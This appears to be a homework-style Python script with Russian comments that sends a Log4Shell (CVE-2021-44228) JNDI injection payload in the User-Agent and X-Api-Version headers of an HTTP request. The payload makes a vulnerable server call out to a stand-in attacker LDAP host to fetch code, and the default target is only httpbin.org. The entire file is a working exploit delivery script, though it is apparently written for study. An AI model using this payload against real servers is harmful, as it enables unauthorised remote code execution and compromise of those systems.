import requests
import time


def simulate_log4shell_attack(target_url):
    """
    Эмуляция атаки Log4Shell (CVE-2021-44228).
    Отправляет HTTP-запрос с JNDI-инъекцией в заголовке User-Agent.
    """
    print(f"[*] Цель атаки: {target_url}")

    # Пейлоад, заставляющий уязвимый сервер обратиться к злоумышленнику
    payload = "${jndi:ldap://hw10-attacker.com/exploit}"

    # Внедряем пейлоад в заголовок User-Agent
    headers = {
        "User-Agent": payload,
        "X-Api-Version": payload
    }

    print(f"[*] Сформирован вредоносный заголовок: User-Agent: {payload}")
    print("[*] Отправка запроса...")

    try:
        # Отправляем запрос (timeout чтобы скрипт не повис, если сервер попытается соединиться с LDAP)
        response = requests.get(target_url, headers=headers, timeout=5)

        print(f"[+] Запрос отправлен. Код ответа: {response.status_code}")
        print("[+] Если сервер уязвим и логирует User-Agent, он попытается соединиться с hw10-attacker.com")

    except requests.exceptions.RequestException as e:
        print(f"[-] Ошибка при отправке запроса: {e}")


if __name__ == "__main__":
    # Используем httpbin.org для безопасного теста (он просто возвращает наши заголовки обратно)
    target = "https://httpbin.org/get"
    simulate_log4shell_attack(target)